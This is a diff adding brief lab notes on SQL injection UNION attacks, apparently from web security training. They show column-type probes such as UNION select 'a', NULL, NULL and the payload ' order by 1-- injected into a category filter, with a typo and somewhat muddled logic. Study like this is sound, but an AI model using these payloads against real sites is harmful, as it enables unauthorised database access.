@@ -1,0 +1,18 @@
+This lab picks up where the last one left off.
+
+SQL Union attack
+Step 1 Determine the number of columns (Previous lab)
+
+Step 2 Determine the data types of the columns
+select a,b,c from table1 UNION selct 'a', NULL, NULL
+-> error, column is not a string
+-> else, column is a string
+
+-> error, select a,b,c from table1 UNION select NULL, 'a', NULL
+-> error, select a,b,c from table1 UNION select NULL, NULL, 'a'
+
+Analysis:
+where category = 'gifts'
+Injection: ' order by 1--
+where category = 'gifts' order by 1--'
+where category = 'gifts' order by 1
